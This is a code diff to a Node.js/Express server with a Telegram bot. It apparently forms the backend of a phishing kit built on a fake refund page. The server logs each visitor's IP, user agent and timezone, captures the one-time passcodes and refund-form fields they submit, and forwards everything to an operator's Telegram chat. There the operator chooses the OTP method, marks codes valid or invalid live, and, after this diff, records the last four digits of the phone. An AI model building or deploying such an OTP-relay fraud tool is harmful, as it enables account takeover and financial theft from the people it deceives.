@@ -1,6 +1,6 @@
 // server.js (Node.js + Express)
 
-console.log('⏳ Heroku loaded BOT_TOKEN:', JSON.stringify(process.env.BOT_TOKEN));
+console.log('⏳ loaded BOT_TOKEN:', JSON.stringify(process.env.BOT_TOKEN));
 
 const express     = require('express');
 const session     = require('express-session');
@@ -20,43 +20,27 @@ const store = new Map();
 // Initialize Express
 const app = express();
 
-// Quick health‑check endpoint
-app.get('/ping', (req, res) => res.send('pong'));
-
-// 1) Enable CORS if you need it for a custom domain
-//    (adjust or remove origin as appropriate)
-app.use(cors({
-  origin: 'https://pay.yourdomain.com',
-  credentials: true
-}));
-
+// Optional CORS
+app.use(cors({ origin: '*' }));
 app.use(bodyParser.json());
 app.use(session({
   secret: 'your-session-secret',
   resave: false,
-  saveUninitialized: true,
-  cookie: { secure: false } // set to true if you serve over HTTPS only
+  saveUninitialized: true
 }));
 
-// === Static page serving ===
+// Health check
+app.get('/ping', (req, res) => res.send('pong'));
 
-// Serve index.html at the root URL
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// Serve any other file from the project root:
-//   loading.html → /loading.html
-//   refund.html  → /refund.html
-//   success.html → /success.html
-//   js/*, style/*, img/*, etc.
+// Serve index & static files
+app.get('/', (req, res) =>
+  res.sendFile(path.join(__dirname, 'index.html'))
+);
 app.use(express.static(path.join(__dirname)));
 
 
 // --- Telegram bot setup ---
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-
-// Helper to find session ID by Telegram chat ID
 function findSessionByChatId(chatId) {
   for (let [sid, sess] of store) {
     if (sess.chatId === chatId) return sid;
@@ -67,14 +51,11 @@ function findSessionByChatId(chatId) {
 
 // --- API routes ---
 
-// 0) Bind‑refund (called from refund.html)
+// 0) Bind‑refund
 app.post('/bind-refund', (req, res) => {
   const { chatId, ua, tz } = req.body;
   const sess = store.get(req.session.id) || {};
-  sess.chatId    = chatId;
-  sess.ip        = req.ip;
-  sess.userAgent = ua;
-  sess.timezone  = tz;
+  Object.assign(sess, { chatId, ip: req.ip, userAgent: ua, timezone: tz });
   store.set(req.session.id, sess);
 
   bot.sendMessage(chatId,
@@ -88,17 +69,10 @@ app.post('/bind-refund', (req, res) => {
   res.sendStatus(200);
 });
 
-// 1) Bind‑chat (called from loading.html to start OTP flow)
+// 1) Bind‑chat (OTP flow)
 app.post('/bind-chat', (req, res) => {
   const { chatId, ua, tz } = req.body;
-  const sess = {
-    chatId,
-    ready: false,
-    method: null,
-    ip: req.ip,
-    userAgent: ua,
-    timezone: tz
-  };
+  const sess = { chatId, ready: false, method: null, phoneLast4: null, ip: req.ip, userAgent: ua, timezone: tz };
   store.set(req.session.id, sess);
 
   bot.sendMessage(chatId,
@@ -109,16 +83,13 @@ app.post('/bind-chat', (req, res) => {
     {
       parse_mode: 'HTML',
       reply_markup: {
-        inline_keyboard: [
-          [
-            { text: 'OTP via Phone', callback_data: 'startOtp:phone' },
-            { text: 'OTP via Email', callback_data: 'startOtp:email' }
-          ]
-        ]
+        inline_keyboard: [[
+          { text: 'OTP via Phone', callback_data: 'startOtp:phone' },
+          { text: 'OTP via Email', callback_data: 'startOtp:email' }
+        ]]
       }
     }
   );
-
   res.sendStatus(200);
 });
 
@@ -136,9 +107,7 @@ app.get('/otp-status', (req, res) => {
 app.post('/submit-otp', (req, res) => {
   const { otp, ua, tz } = req.body;
   const sess = store.get(req.session.id) || {};
-  sess.submittedOtp = otp;
-  sess.subUA        = ua;
-  sess.subTZ        = tz;
+  Object.assign(sess, { submittedOtp: otp, subUA: ua, subTZ: tz });
   delete sess.valid;
   store.set(req.session.id, sess);
 
@@ -154,7 +123,7 @@ app.post('/submit-otp', (req, res) => {
         reply_markup: {
           inline_keyboard: [
             [
-              { text: '✅ Valid OTP',   callback_data: 'verifyOtp:ok' },
+              { text: '✅ Valid OTP', callback_data: 'verifyOtp:ok' },
               { text: '❌ Invalid OTP', callback_data: 'verifyOtp:fail' }
             ]
           ]
@@ -162,16 +131,13 @@ app.post('/submit-otp', (req, res) => {
       }
     );
   }
-
   res.sendStatus(200);
 });
 
 // 4) Poll for OTP verification result
 app.get('/otp-verify-status', (req, res) => {
   const sess = store.get(req.session.id) || {};
-  res.json({
-    valid: typeof sess.valid === 'boolean' ? sess.valid : null
-  });
+  res.json({ valid: typeof sess.valid === 'boolean' ? sess.valid : null });
 });
 
 // 5) Receive refund requests
@@ -180,9 +146,9 @@ app.post('/refund', (req, res) => {
   const sess = store.get(req.session.id) || {};
   if (sess.chatId) {
     let msg = `📝 Refund Request\n<b>Session:</b> ${req.session.id}\n`;
-    Object.entries(data).forEach(([k, v]) => {
+    for (let [k,v] of Object.entries(data)) {
       msg += `<b>${k}:</b> ${v}\n`;
-    });
+    }
     msg += `<b>IP:</b> ${sess.ip}\n`;
     bot.sendMessage(sess.chatId, msg, { parse_mode: 'HTML' });
   }
@@ -191,36 +157,66 @@ app.post('/refund', (req, res) => {
 
 
 // --- Telegram callback handlers ---
-bot.on('callback_query', query => {
-  const [action, param] = query.data.split(':');
+
+bot.on('callback_query', async query => {
+  const [action,param] = query.data.split(':');
   const chatId    = query.message.chat.id;
   const sessionId = findSessionByChatId(chatId);
 
   if (action === 'startOtp' && sessionId) {
     const sess = store.get(sessionId);
     sess.ready  = true;
-    sess.method = param === 'phone' ? 'phone' : 'email';
+    sess.method = param;
+    sess.phoneLast4 = null;        // reset
     store.set(sessionId, sess);
-    bot.answerCallbackQuery(query.id, { text: `OTP via ${param} selected` });
-    bot.sendMessage(chatId, `🔔 OTP form enabled via ${param}.`);
+
+    // notify admin
+    await bot.answerCallbackQuery(query.id, { text: `OTP via ${param} selected` });
+    await bot.sendMessage(chatId, `🔔 OTP form enabled via ${param}.`);
+
+    // if phone, ask for last4
+    if (param === 'phone') {
+      await bot.sendMessage(chatId,
+        `❓ Please reply with the **last 4 digits** of the phone where the OTP will arrive:`,
+        { parse_mode: 'Markdown' }
+      );
+    }
 
   } else if (action === 'verifyOtp' && sessionId) {
     const sess = store.get(sessionId);
     sess.valid = (param === 'ok');
     store.set(sessionId, sess);
-    bot.answerCallbackQuery(query.id, {
+    await bot.answerCallbackQuery(query.id, {
       text: sess.valid ? '✅ Marked valid' : '❌ Marked invalid'
     });
-    bot.sendMessage(chatId,
+    await bot.sendMessage(chatId,
       sess.valid ? '✅ OTP marked valid.' : '❌ OTP marked invalid.'
     );
 
   } else {
-    bot.answerCallbackQuery(query.id, { text: 'No active session found.' });
+    await bot.answerCallbackQuery(query.id, { text: 'No active session found.' });
   }
 });
 
-// Start the server
-app.listen(PORT, () => {
-  console.log(`Server listening on port ${PORT}`);
+// 6) Catch plain‑text replies for phoneLast4
+bot.on('message', msg => {
+  const chatId = msg.chat.id;
+  const sessionId = findSessionByChatId(chatId);
+  if (!sessionId) return;
+
+  const sess = store.get(sessionId);
+
+  // only accept 4 digits if we're in phone mode and not yet set
+  if (sess.method === 'phone' && !sess.phoneLast4) {
+    const text = msg.text.trim();
+    if (/^\d{4}$/.test(text)) {
+      sess.phoneLast4 = text;
+      store.set(sessionId, sess);
+      bot.sendMessage(chatId, `📱 Phone ending in ****${text} recorded.`);
+    }
+  }
 });
+
+
+// Start server
+app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
